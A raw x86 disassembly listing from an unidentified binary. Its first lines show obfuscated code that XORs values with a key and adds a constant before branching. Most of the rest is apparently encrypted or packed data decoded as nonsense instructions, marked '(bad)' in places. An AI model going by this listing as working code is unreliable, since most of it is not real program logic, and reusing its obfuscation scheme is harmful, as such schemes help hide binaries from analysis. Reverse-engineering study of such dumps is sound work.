  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	jge    0x4062f4
  40635c:	nop
  40635d:	dec    ecx
  40635e:	cmp    BYTE PTR [ebx],bh
  406360:	bound  esp,QWORD PTR [edx+0x10]
  406363:	pop    edi
  406364:	bound  esp,QWORD PTR [edx-0x70]
  406367:	retf   0x260f
  40636a:	pusha  
  40636b:	call   0x4ac2:0xbdcd5c9a
  406372:	jbe    0x406322
  406374:	and    dl,BYTE PTR [ecx+0x357c6181]
  40637a:	mov    dl,bh
  40637c:	sub    DWORD PTR [edi+0x761ddd3e],esi
  406382:	lahf   
  406383:	xor    eax,0x730b534b
  406388:	mov    eax,0x296f079a
  40638d:	sbb    ch,BYTE PTR [esi+0x6b]
  406390:	jns    0x4063aa
  406392:	fcmovu st,st(6)
  406394:	in     eax,0x75
  406396:	in     al,dx
  406397:	in     al,0x2f
  406399:	rcl    BYTE PTR [esi+0x7a],0xa9
  40639d:	sar    BYTE PTR [edi+0x3d],1
  4063a0:	xor    BYTE PTR [eax+ecx*2+0x604d8764],ch
  4063a7:	out    dx,al
  4063a8:	popa   
  4063a9:	add    BYTE PTR [ebx+0x4537c76b],dl
  4063af:	call   0x203f48e3
  4063b4:	bound  ebx,QWORD PTR [ebx+0x48a4878b]
  4063ba:	mov    ds:0x1e8e339c,al
  4063bf:	mov    eax,0x9d064518
  4063c4:	aad    0xef
  4063c6:	cld    
  4063c7:	(bad)  
  4063c8:	mov    ebp,0xeb6494d8
  4063cd:	sar    BYTE PTR [ecx],0x0
  4063d0:	ja     0x406444
  4063d2:	daa    
  4063d3:	pop    edx
  4063d4:	fadd   QWORD PTR [edx-0x2603acb5]
  4063da:	pop    ds
  4063db:	in     al,0x7d
  4063dd:	xchg   esp,eax
  4063de:	stc    
  4063df:	leave  
  4063e0:	xchg   ebp,eax
  4063e1:	pusha  
  4063e2:	add    al,0x79
  4063e4:	ret    0x9e6b
  4063e7:	or     DWORD PTR [edx+0x47118e83],0xffffffe4
  4063ee:	xchg   esi,eax
  4063ef:	stos   BYTE PTR es:[edi],al
  4063f0:	xor    dl,ch
  4063f2:	add    eax,0xc4bcd00d
  4063f7:	jmp    0x731:0x721c4b9c
  4063fe:	je     0x406452
  406400:	mov    dl,0xb9
  406402:	inc    esp
  406403:	or     DWORD PTR [ecx],esp
  406405:	outs   dx,DWORD PTR ds:[esi]
  406406:	and    BYTE PTR [ecx+0x42],dl
  406409:	fdiv   QWORD PTR [ecx+0x1f]
  40640c:	into   
  40640d:	ret    0x3394
  406410:	jl     0x4063a3
  406412:	imul   esp,DWORD PTR [esi],0x38
  406415:	gs jbe 0x406473
  406418:	addr16 test al,0x7f
  40641b:	int3   
  40641c:	jb     0x40647a
  40641e:	pop    esi
  40641f:	mov    esi,0x11edac42
  406424:	aad    0xdc
  406426:	out    dx,al
  406427:	cmp    BYTE PTR [edx+0x4a],al
  40642a:	or     ch,BYTE PTR [esi-0xf15401b]
  406430:	bound  ebp,QWORD PTR [edi-0x18]
  406433:	inc    di
  406435:	push   ss
  406436:	pop    ebp
  406437:	test   al,0xa9
  406439:	inc    ecx
  40643a:	push   ds
  40643b:	inc    ebp
  40643c:	adc    eax,0x3ba0e3af
  406441:	and    esp,DWORD PTR [esi+0x60dec874]
  406447:	aam    0x6f
  406449:	aaa    
  40644a:	mov    ch,ah
  40644c:	adc    eax,0xdc6c2f2b
  406451:	mov    ds:0x3e0aa36d,al
  406456:	jp     0x4064c7
  406458:	sbb    dh,bl
  40645a:	imul   esp,DWORD PTR gs:[ebp-0x5a],0xffffff8c
  40645f:	jne    0x4064c0
  406461:	push   cs
  406462:	int3   
  406463:	adc    BYTE PTR [ecx+0x13],dh
  406466:	push   edx
  406467:	sbb    eax,eax
  406469:	push   DWORD PTR ds:0x3dcc2afd
  40646f:	xchg   ebp,eax
  406470:	mov    al,0xd1
  406472:	or     ah,dh
  406474:	out    dx,eax
  406475:	inc    ebx
  406476:	(bad)  
  406477:	dec    esp
  406478:	inc    esp
  406479:	xor    bh,cl
  40647b:	fmul   QWORD PTR [ecx+esi*1+0x12]
  40647f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406480:	mov    ds:0xcf21055d,eax
  406485:	jl     0x4064ee
  406487:	xor    eax,0xc1f09a08
  40648c:	cmp    eax,0x43c5d499
  406491:	call   DWORD PTR [edx-0x7b3152e7]
  406497:	idiv   DWORD PTR [esi+0x69]
  40649a:	inc    esi
  40649b:	imul   bl
  40649d:	adc    al,0x57
  40649f:	sbb    edx,ebx
  4064a1:	popf   
  4064a2:	add    BYTE PTR [ecx+0xaee0bcd],bl
  4064a8:	mov    bh,0xae
  4064aa:	ror    BYTE PTR [esi-0xd14c1a6],cl
  4064b0:	and    eax,0xd5dbc9eb
  4064b5:	cld    
  4064b6:	push   esi
  4064b7:	jno    0x406453
  4064b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064ba:	xor    eax,0xbd82760f
  4064bf:	xor    ah,BYTE PTR [esi+0x66]
  4064c2:	test   BYTE PTR [ebx+0x59],dh
  4064c5:	fmul   QWORD PTR [ecx]
  4064c7:	test   DWORD PTR [ecx-0x59],edi
  4064ca:	or     al,0x3d
  4064cc:	test   DWORD PTR [esi],edx
  4064ce:	or     eax,0xa50edbe0
  4064d3:	(bad)  
  4064d4:	test   BYTE PTR [eax+0x60],0xf
  4064d8:	call   0x3ea:0xaffa058f
  4064df:	neg    DWORD PTR [ecx+0x3390e86c]
  4064e5:	sbb    ch,ch
  4064e7:	jmp    0xa354:0x64fbe758
  4064ee:	aad    0xde
  4064f0:	(bad)
  4064f3:	sbb    edi,esp
  4064f5:	push   ds
  4064f6:	cmp    BYTE PTR [esi],bl
  4064f8:	stos   BYTE PTR es:[edi],al
  4064f9:	jo     0x40649f
  4064fb:	push   esp
  4064fc:	mov    ss,WORD PTR ds:[eax]
  4064ff:	test   bh,al
  406501:	fwait
  406502:	or     esi,ecx
  406504:	mov    cl,0x66
  406506:	lods   al,BYTE PTR ds:[esi]
  406507:	sbb    dh,ch
  406509:	daa    
  40650a:	cmc    
  40650b:	add    ch,ch
  40650d:	leave  
  40650e:	mov    ecx,0x262bbb6a
  406513:	mov    fs:0x7b7669c0,eax
  406519:	popa   
  40651a:	sbb    esp,DWORD PTR [esp+esi*8]
  40651d:	jmp    0x406550
  40651f:	sar    DWORD PTR [esi-0x59],cl
  406522:	imul   ch
  406524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406525:	sbb    BYTE PTR [ebx-0x20],bh
  406528:	adc    BYTE PTR [edi-0x1b],dh
  40652b:	xchg   esi,eax
  40652c:	cmp    edx,edx
  40652e:	mov    WORD PTR [edx-0x441afd33],gs
  406534:	out    dx,al
  406535:	popf   
  406536:	out    dx,al
  406537:	adc    edx,DWORD PTR [edx]
  406539:	mov    BYTE PTR [ebx-0x61],dh
  40653c:	(bad)  
  40653d:	stos   DWORD PTR es:[edi],eax
  40653e:	(bad)  
  40653f:	retf   0xd7c7
  406542:	adc    DWORD PTR [eax-0x516aabee],0x4fa489a8
  40654c:	jo     0x406529
  40654e:	mov    ds:0xe9d4f1a,al
  406553:	repz mov bl,0x89
  406556:	inc    edx
  406557:	call   0x366e:0x3775d882
  40655e:	ret    
  40655f:	and    DWORD PTR [ecx-0x4ecde567],edi
  406565:	or     DWORD PTR [eax+0x3152d3c0],0xffffffc4
  40656c:	stos   DWORD PTR es:[edi],eax
  40656d:	ja     0x4064f4
  40656f:	cmc    
  406570:	dec    edi
  406571:	lock je 0x4065c2
  406574:	jns    0x4065a7
  406576:	repz cli 
  406578:	stc    
  406579:	enter  0x346a,0xb8
  40657d:	push   esi
  40657e:	or     eax,0xc9d83cf5
  406583:	sub    ah,BYTE PTR [ecx+ebp*1]
  406586:	mov    esi,0xa7efd3b0
  40658b:	jbe    0x406552
  40658d:	inc    esp
  40658e:	mov    al,ds:0x59858a0f
  406593:	jmp    0x43b5:0xb5a677f9
  40659a:	dec    ecx
  40659b:	add    BYTE PTR [esi-0x1f],ch
  40659e:	in     al,0x18
  4065a0:	xchg   BYTE PTR [eax],ch
  4065a2:	xchg   ecx,eax
  4065a3:	popf   
  4065a4:	push   edx
  4065a5:	cdq    
  4065a6:	mov    bh,0xe3
  4065a8:	mov    eax,0x785c13ca
  4065ad:	lods   al,BYTE PTR ds:[esi]
  4065ae:	xchg   ebx,eax
  4065af:	jnp    0x4065af
  4065b1:	popa   
  4065b2:	rcl    edx,1
  4065b4:	push   ss
  4065b5:	cmp    ecx,ebp
  4065b7:	fisttp QWORD PTR [ecx]
  4065b9:	cdq    
  4065ba:	jecxz  0x40660e
  4065bc:	stos   BYTE PTR es:[edi],al
  4065bd:	push   cs
  4065be:	in     al,dx
  4065bf:	sbb    eax,0x54f67203
  4065c4:	cmp    eax,0x7660d0c2
  4065c9:	(bad)  
  4065ca:	aad    0xb0
  4065cc:	mov    bh,0x46
  4065ce:	stos   BYTE PTR es:[edi],al
  4065cf:	mov    cl,0x63
  4065d1:	test   al,0x7b
  4065d3:	and    BYTE PTR [eax+0xf],ch
  4065d6:	adc    DWORD PTR [ebx],eax
  4065d8:	fmul   DWORD PTR [esi]
  4065da:	push   ss
  4065db:	sar    BYTE PTR ds:0x8aab84e4,cl
  4065e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065e2:	out    0x4b,eax
  4065e4:	in     al,dx
  4065e5:	data16 ja 0x406654
  4065e8:	(bad)  
  4065e9:	jge    0x406644
  4065eb:	xor    eax,0x61e30086
  4065f0:	sbb    esi,DWORD PTR [eax-0x1b]
  4065f3:	out    dx,eax
  4065f4:	outs   dx,BYTE PTR ds:[esi]
  4065f5:	call   0x7b265d03
  4065fa:	mov    gs,WORD PTR ds:0x7c0bd659
  406600:	neg    edi
  406602:	add    ecx,DWORD PTR [ebx-0x593808bf]
  406608:	scas   eax,DWORD PTR es:[edi]
  406609:	in     al,0xbb
  40660b:	mov    esi,0x10e1d945
  406610:	out    0xcc,al
  406612:	aad    0xfc
  406614:	adc    BYTE PTR [esi+0x12],0xce
  406618:	mov    bl,0x96
  40661a:	ja     0x406643
  40661c:	(bad)  
  40661d:	test   DWORD PTR [edx+ebx*4-0x6f],0xdcb8a68f
  406625:	(bad)  
  406626:	iret   
  406627:	repnz push eax
  406629:	push   eax
  40662a:	fwait
  40662b:	lds    ecx,FWORD PTR [edi+0xce39e28]
  406631:	adc    al,0x95
  406633:	jg     0x40668e
  406635:	clc    
  406636:	sar    dh,0xa7
  406639:	mov    ch,0x9
  40663b:	mov    ds:0x4b1b9d69,eax
  406640:	int    0x24
  406642:	sub    ebp,edx
  406644:	inc    ebx
  406645:	(bad)
  406648:	call   0x979d:0x2a123d14
  40664f:	and    BYTE PTR [esp+esi*2],ch
  406652:	sbb    BYTE PTR [ebx+0x7699339f],bh
  406658:	push   ss
  406659:	or     eax,0xc55e5252
  40665e:	jb     0x406634
  406660:	out    0xf1,al
  406662:	mov    ch,0x5b
  406664:	xchg   ebp,eax
  406665:	test   DWORD PTR [ebx-0x77c763f6],eax
  40666b:	sbb    edi,DWORD PTR gs:[edi+eiz*2-0x11]
  406670:	test   eax,0x5f149b6c
  406675:	jge    0x406603
  406677:	or     BYTE PTR ss:[ebp-0xe],dh
  40667b:	inc    eax
  40667c:	ret    0xafa2
  40667f:	jecxz  0x4066dd
  406681:	imul   ecx,ebx,0x5ca6f8fd
  406687:	shl    DWORD PTR ds:0xc40076cf,cl
  40668d:	jecxz  0x406686
  40668f:	add    al,0x6e
  406691:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406692:	add    edx,ebx
  406694:	and    BYTE PTR ds:0xc096fa06,cl
  40669a:	(bad)  
  40669b:	jb     0x406669
  40669d:	jb     0x40670c
  40669f:	repz push 0x54
  4066a2:	aaa    
  4066a3:	mov    bl,0x35
  4066a5:	fbld   TBYTE PTR [edx-0x55]
  4066a8:	mov    ch,0x27
  4066aa:	stos   DWORD PTR es:[edi],eax
  4066ab:	mov    bh,0xdd
  4066ad:	sub    eax,edi
  4066af:	pushf  
  4066b0:	ins    DWORD PTR es:[edi],dx
  4066b1:	lods   al,BYTE PTR ds:[esi]
  4066b2:	imul   edi,ebx,0xc9cb6485
  4066b8:	sub    edx,edi
  4066ba:	call   0x668e:0x2301d2b5
  4066c1:	xor    ch,BYTE PTR [eax-0x2a]
  4066c4:	ret    0xf311
  4066c7:	xor    DWORD PTR [eax+0x37e8338d],edx
  4066cd:	dec    edx
  4066ce:	or     edi,DWORD PTR [esi+0x631d7863]
  4066d4:	inc    ebp
  4066d5:	or     BYTE PTR [ebx+0x611d0e8],dl
  4066db:	cs aaa 
  4066dd:	add    al,0x19
  4066df:	test   eax,0x745bd76d
  4066e4:	rcr    DWORD PTR [edx+edx*1+0x67],1
  4066e8:	out    dx,al
  4066e9:	and    BYTE PTR [ecx+0x47],0x9e
  4066ed:	pushf  
  4066ee:	pop    edx
  4066ef:	ficomp WORD PTR [ebx+edi*1-0x1af21dac]
  4066f6:	data16 jbe 0x4066a3
  4066f9:	setle  BYTE PTR [ecx+ebp*8-0x65eec5ae]
  406701:	nop
  406702:	lahf   
  406703:	xor    bl,bh
  406705:	mov    edi,DWORD PTR [ebp-0x5d]
  406708:	scas   eax,DWORD PTR es:[edi]
  406709:	and    edx,ecx
  40670b:	sbb    eax,0xc0e32609
  406710:	jmp    0xd808:0x38a7125c
  406717:	pushf  
  406718:	and    DWORD PTR ss:[ecx+0x4],ebp
  40671c:	popa   
  40671d:	sub    eax,0x97639de1
  406722:	jnp    0x40677e
  406724:	test   eax,0x94201fff
  406729:	in     al,dx
  40672a:	aas    
  40672b:	push   cs
  40672c:	adc    ch,BYTE PTR [eax-0x6e]
  40672f:	xor    eax,0x229de484
  406734:	daa    
  406735:	push   0xfffffff6
  406737:	push   ss
  406738:	stos   BYTE PTR es:[edi],al
  406739:	int    0xd
  40673b:	mov    ebp,DWORD PTR [esi-0x307a200b]
  406741:	jo     0x4066fe
  406743:	bound  esi,QWORD PTR [edi-0x172ba059]
  406749:	sub    al,0xbb
  40674b:	adc    ch,bl
  40674d:	out    dx,al
  40674e:	fnstsw WORD PTR [ecx-0x76]
  406751:	imul   edi,DWORD PTR [eax],0x45b3f23d
  406757:	sub    edx,DWORD PTR [edi-0x1f]
  40675a:	mov    al,0x9e
  40675c:	sub    bh,dh
  40675e:	jb     0x406750
  406760:	lods   al,BYTE PTR ds:[esi]
  406761:	mov    ecx,0xd26e69ac
  406766:	or     eax,0x6108e285
  40676b:	addr16 and eax,0xc1a066db
  406771:	imul   esp,DWORD PTR [eax],0x1e
  406774:	setbe  dh
  406777:	call   0x472ac988
  40677c:	xchg   ebp,eax
  40677d:	in     al,dx
  40677e:	mov    ebp,0xc30ae0f7
  406783:	div    DWORD PTR [edi+eax*1-0x6e]
  406787:	jb     0x406760
  406789:	ror    DWORD PTR [edx+0x8],1
  40678c:	mov    dl,0xf8
  40678e:	push   ebp
  40678f:	push   esi
  406790:	add    esi,DWORD PTR [edi+0x12]
  406793:	pop    ss
  406794:	lods   eax,DWORD PTR ds:[esi]
  406795:	fs pushf 
  406797:	out    0xef,al
  406799:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40679a:	xlat   BYTE PTR ds:[ebx]
  40679b:	xchg   DWORD PTR [ebx-0x2a26685f],eax
  4067a1:	jl     0x40676c
  4067a3:	cmp    ebx,DWORD PTR [ebp-0x60b338b1]
  4067a9:	jg     0x40673b
  4067ab:	sbb    edi,edi
  4067ad:	fsub   st(6),st
  4067af:	fwait
  4067b0:	xchg   esp,eax
  4067b1:	sbb    bl,BYTE PTR [ebp-0x1c]
  4067b4:	jl     0x4067f4
  4067b6:	repz adc eax,0x84eab226
  4067bc:	dec    edi
  4067bd:	xor    eax,0x88ac5fb
  4067c2:	ffreep st(4)
  4067c4:	pop    ebp
  4067c5:	mov    edi,eax
  4067c7:	xor    DWORD PTR [esi],esi
  4067c9:	jnp    0x40676b
  4067cb:	aam    0xbb
  4067cd:	fdivrp st(3),st
  4067cf:	stc    
  4067d0:	xor    cl,BYTE PTR [ebx]
  4067d2:	js     0x4067df
  4067d4:	test   al,0x29
  4067d6:	pusha  
  4067d7:	adc    al,0x71
  4067d9:	shr    dl,1
  4067db:	push   ds
  4067dc:	mov    al,ds:0x8630c29d
  4067e1:	call   0xd173:0x3e3bb173
  4067e8:	sbb    al,0xb8
  4067ea:	out    dx,eax
  4067eb:	in     al,0x4d
  4067ed:	mov    WORD PTR [ebx+ebp*4-0x1e6dde05],ss
  4067f4:	add    edi,DWORD PTR [eax+0x66]
  4067f7:	leave  
  4067f8:	sub    esp,DWORD PTR [edi]
  4067fa:	call   0x32f6:0x427bee87
  406801:	cmp    ebx,ebx
  406803:	and    bh,BYTE PTR [ecx+0x3d]
  406806:	mov    cl,0xf6
  406808:	fild   QWORD PTR [ebx-0x70]
  40680b:	sub    al,0x79
  40680d:	push   ebp
  40680e:	jbe    0x4067c2
  406810:	in     al,dx
  406811:	mov    bh,0x6c
  406813:	hlt    
  406814:	xor    eax,0x9175d8bc
  406819:	pop    ebp
  40681a:	xlat   BYTE PTR ds:[ebx]
  40681b:	dec    edi
  40681c:	jne    0x406813
  40681e:	outs   dx,DWORD PTR ds:[esi]
  40681f:	pop    edi
  406820:	call   0xdb45:0x1a0ce2ca
  406827:	xor    bh,BYTE PTR [ebx-0x512fe902]
  40682d:	aaa    
  40682e:	jmp    0xc885990b
  406833:	mov    ecx,0x5b451e18
  406838:	mov    esi,0x9a8f7aac
  40683d:	push   0x7c4d640
  406842:	adc    al,ch
  406844:	xchg   edx,eax
  406845:	shl    DWORD PTR [ebp-0x72d6207],1
  40684b:	mov    eax,ds:0x488d53be
  406850:	(bad)  
  406851:	cmp    DWORD PTR [edx-0x3089ef2a],ebp
  406857:	cdq    
  406858:	push   es
  406859:	inc    edx
  40685a:	in     al,0x80
  40685c:	sar    ebp,0xb0
  40685f:	dec    edx
  406860:	std    
  406861:	sar    BYTE PTR [eax+0x6f1a49d7],1
  406867:	jbe    0x406889
  406869:	push   esp
  40686a:	dec    ecx
  40686b:	call   0xb0ec:0x9f5ba793
  406872:	or     eax,0xb2302cc2
  406877:	ins    DWORD PTR es:[edi],dx
  406878:	add    esi,DWORD PTR [esi+0x702ecf01]
  40687e:	ds (bad) 
  406880:	lods   al,BYTE PTR ds:[esi]
  406881:	cld    
  406882:	mov    DWORD PTR [eax],ebx
  406884:	jns    0x4068e6
  406886:	das    
  406887:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406888:	retf   
  406889:	outs   dx,BYTE PTR ds:[esi]
  40688a:	rcr    BYTE PTR [edx-0x6f],cl
  40688d:	xor    BYTE PTR [esi+ebp*2],ch
  406890:	or     al,bh
  406892:	out    dx,eax
  406893:	mov    dl,0x5a
  406895:	or     DWORD PTR [eax],esp
  406897:	test   BYTE PTR cs:[esi-0x62b6bf02],bh
  40689e:	push   ds
  40689f:	repnz push dx
  4068a2:	popa   
  4068a3:	dec    ebp
  4068a4:	add    BYTE PTR [ebx-0x1bf18b5c],al
  4068aa:	cmp    eax,0x9e84cd34
  4068af:	int3   
  4068b0:	sub    cl,ch
  4068b2:	pop    ss
  4068b3:	dec    ebp
  4068b4:	sti    
  4068b5:	daa    
  4068b6:	push   ebx
  4068b7:	mov    esp,0xbaf8570f
  4068bc:	fcmovnu st,st(7)
  4068be:	pushf  
  4068bf:	dec    esi
  4068c0:	addr16 std 
  4068c2:	(bad)  
  4068c3:	call   0x1877:0x57273ad4
  4068ca:	xchg   esp,eax
  4068cb:	aaa    
  4068cc:	loope  0x4068e4
  4068ce:	lahf   
  4068cf:	hlt    
  4068d0:	adc    BYTE PTR [ecx],dl
  4068d2:	imul   ebp,ecx,0x3afb77a5
  4068d8:	in     al,0xca
  4068da:	ret    
  4068db:	jge    0x4068dd
  4068dd:	adc    eax,0xf0c45da5
  4068e2:	je     0x40686f
  4068e4:	pop    es
  4068e5:	in     eax,0x14
  4068e7:	les    esi,FWORD PTR [ecx+0x9]
  4068ea:	(bad)  
  4068eb:	xchg   ebp,eax
  4068ec:	jmp    0x4068ca
  4068ee:	sub    eax,0x85e2fa1c
  4068f3:	(bad)  
  4068f4:	arpl   di,sp
  4068f6:	ret    
  4068f7:	fadd   QWORD PTR [eax]
  4068f9:	fs mov edx,0x62b37d28
  4068ff:	ret    0xdc21
  406902:	pop    edi
  406903:	jmp    0x4068cf
  406905:	ret    
  406906:	aaa    
  406907:	jnp    0x406912
  406909:	cmp    cl,cl
  40690b:	(bad)  
  40690c:	xchg   ebp,eax
  40690d:	sub    al,0x23
  40690f:	stos   DWORD PTR es:[edi],eax
  406910:	in     eax,0x6
  406912:	push   ebx
  406913:	test   eax,0x17ecb9e8
  406918:	or     al,0x26
  40691a:	ins    DWORD PTR es:[edi],dx
  40691b:	push   edx
  40691c:	es (bad) 
  40691e:	xor    BYTE PTR [eax-0x635945d8],ch
  406924:	xchg   ebx,eax
  406925:	sbb    BYTE PTR [esi-0x69],0x94
  406929:	sub    eax,0xee7d0f4a
  40692e:	add    bl,BYTE PTR [edx-0x448365d6]
  406934:	jo     0x40693d
  406936:	dec    ecx
  406937:	lea    ecx,[edi-0x5dd444ab]
  40693d:	mov    dl,0x4c
  40693f:	mov    BYTE PTR [esp+ecx*2+0x37b5ae9c],cl
  406946:	add    BYTE PTR [ebp+eax*8+0x5],0x59
  40694b:	push   edi
  40694c:	clc    
  40694d:	sub    BYTE PTR [eax+0x5c5cf84],dl
  406953:	dec    ebp
  406954:	mov    ds,WORD PTR [eax]
  406956:	cmp    eax,DWORD PTR [edx]
  406958:	arpl   WORD PTR [edi],si
  40695a:	pushf  
  40695b:	inc    ebp
  40695c:	jb     0x4068e9
  40695e:	(bad)  
  40695f:	ror    DWORD PTR [edx+ebp*4-0x22],1
  406963:	jecxz  0x40690f
  406965:	mov    eax,ds:0x7e5edcbe
  40696a:	inc    esi
  40696b:	cmc    
  40696c:	push   esi
  40696d:	loopne 0x40695b
  40696f:	lods   eax,DWORD PTR ds:[esi]
  406970:	push   DWORD PTR [ebp+0x7b]
  406973:	jnp    0x4069a4
  406975:	rcr    BYTE PTR [ebp-0xc2ff622],1
  40697b:	inc    ecx
  40697c:	sub    BYTE PTR [ecx-0x2aa60857],cl
  406982:	mov    ebx,0xf8b2fda0
  406987:	jle    0x40698c
  406989:	fist   DWORD PTR [edi]
  40698b:	mov    ds:0x4625eb84,eax
  406990:	aaa    
  406991:	add    edx,ebx
  406993:	iret   
  406994:	pop    ds
  406995:	push   0x9fabd1bf
  40699a:	sbb    esp,ecx
  40699c:	mov    eax,ds:0x490f1fec
  4069a1:	out    dx,eax
  4069a2:	push   ss
  4069a3:	scas   eax,DWORD PTR es:[edi]
  4069a4:	into   
  4069a5:	mov    BYTE PTR [edi+0x67],cl
  4069a8:	retf   0xb413
  4069ab:	jge    0x406985
  4069ad:	push   ds
  4069ae:	in     eax,dx
  4069af:	pop    ecx
  4069b0:	add    dl,ah
  4069b2:	clc    
  4069b3:	sbb    eax,0x62f94f27
  4069b8:	stos   DWORD PTR es:[edi],eax
  4069b9:	mov    BYTE PTR [edi+0x4f4cc01],bl
  4069bf:	jnp    0x40695f
  4069c1:	mov    dh,0x2f
  4069c3:	sbb    eax,0xcfd4d9ac
  4069c8:	jmp    0x406a39
  4069ca:	adc    eax,0x70a1702a
  4069cf:	sub    al,0x6b
  4069d1:	pushf  
  4069d2:	lock xchg edx,eax
  4069d4:	xlat   BYTE PTR ds:[ebx]
  4069d5:	sahf   
  4069d6:	mov    ecx,ebp
  4069d8:	adc    BYTE PTR [ebx],0x58
  4069db:	aad    0x9a
  4069dd:	in     al,dx
  4069de:	scas   eax,DWORD PTR es:[edi]
  4069df:	clc    
  4069e0:	mov    al,ds:0xa9305ebf
  4069e5:	mov    ch,0x61
  4069e7:	jp     0x406a50
  4069e9:	jle    0x4069b3
  4069eb:	outs   dx,BYTE PTR ds:[esi]
  4069ec:	addr16 inc esi
  4069ee:	nop
  4069ef:	pop    ds
  4069f0:	stc    
  4069f1:	mov    esi,0xcd114323
  4069f6:	call   0xffc2:0x5e77a037
  4069fd:	mov    ebx,0x208233d7
  406a02:	and    dh,BYTE PTR [eax-0x2ad6a3ef]
  406a08:	sub    DWORD PTR [esi],0x5609a143
  406a0e:	popa   
  406a0f:	loop   0x4069bb
  406a11:	or     DWORD PTR [esi-0x1c],edi
  406a14:	mov    ?,WORD PTR [ebx+0x4d]
  406a17:	sub    bl,bh
  406a19:	out    dx,al
  406a1a:	outs   dx,DWORD PTR ds:[esi]
  406a1b:	jb     0x406a06
  406a1d:	retf   0x5efc
  406a20:	and    BYTE PTR [ebx-0x5],ch
  406a23:	jne    0x4069ed
  406a25:	or     edi,DWORD PTR [ecx-0x39]
  406a28:	les    ebp,FWORD PTR [esi+0x17]
  406a2b:	pop    ecx
  406a2c:	inc    edi
  406a2d:	cmp    DWORD PTR [eax+esi*4+0x777e468e],0x111eb331
  406a38:	outs   dx,BYTE PTR ds:[esi]
  406a39:	fwait
  406a3a:	and    eax,DWORD PTR [ecx-0x1541c442]
  406a40:	or     eax,0x29d240c7
  406a45:	add    al,0x77
  406a47:	cwde   
  406a48:	iret   
  406a49:	lods   eax,DWORD PTR ds:[esi]
  406a4a:	call   0xdb97:0xcfb1e9a0
  406a51:	test   al,0xd3
  406a53:	outs   dx,BYTE PTR ds:[esi]
  406a54:	test   al,0xae
  406a56:	or     BYTE PTR [edi],al
  406a58:	or     DWORD PTR [esp+edi*2-0x28],esi
  406a5c:	test   DWORD PTR [edi-0x28],ecx
  406a5f:	mov    ?,WORD PTR [esi+0x3]
  406a62:	ja     0x406a83
  406a64:	popa   
  406a65:	push   edx
  406a66:	jmp    0x36c9edf8
  406a6b:	cmp    BYTE PTR [ebx+eiz*2+0x582fc147],bl
  406a72:	sbb    ebp,DWORD PTR [eax]
  406a74:	or     al,0xa0
  406a76:	pushf  
  406a77:	lods   al,BYTE PTR ds:[esi]
  406a78:	mov    ebx,ebx
  406a7a:	and    dh,BYTE PTR [eax+0x2d23a604]
  406a80:	or     BYTE PTR [eax+ebp*1-0x7d],ch
  406a84:	jb     0x406a51
  406a86:	aam    0x93
  406a88:	shl    BYTE PTR [eax-0x60b67d0f],1
  406a8e:	lahf   
  406a8f:	les    esi,FWORD PTR [edx+0x1d]
  406a92:	push   ds
  406a93:	lock xchg esi,eax
  406a95:	fldcw  WORD PTR [edx-0x588ee69c]
  406a9b:	jmp    0x406a82
  406a9d:	ins    BYTE PTR es:[edi],dx
  406a9e:	mov    dl,0x16
  406aa0:	pop    eax
  406aa1:	jns    0x406a4d
  406aa3:	enter  0x501e,0xa3
  406aa7:	fwait
  406aa8:	imul   ebp,DWORD PTR [edx-0x72ff0295],0x29b1c1e8
  406ab2:	or     al,bl
  406ab4:	ins    BYTE PTR es:[edi],dx
  406ab5:	inc    edx
  406ab6:	pushf  
  406ab7:	sbb    BYTE PTR [esi-0x4],bl
  406aba:	pop    esi
  406abb:	mov    ebx,0xc7ff1b0e
  406ac0:	stos   BYTE PTR es:[edi],al
  406ac1:	shl    BYTE PTR [ecx+0x46],cl
  406ac4:	icebp  
  406ac5:	push   esi
  406ac6:	inc    ebx
  406ac7:	mov    dh,0xcb
  406ac9:	mov    al,0x6
  406acb:	mov    edi,0x877c3865
  406ad0:	xor    ch,dh
  406ad2:	js     0x406aaf
  406ad4:	pop    esp
  406ad5:	cmp    BYTE PTR [esi-0x33ebf6f7],dh
  406adb:	leave  
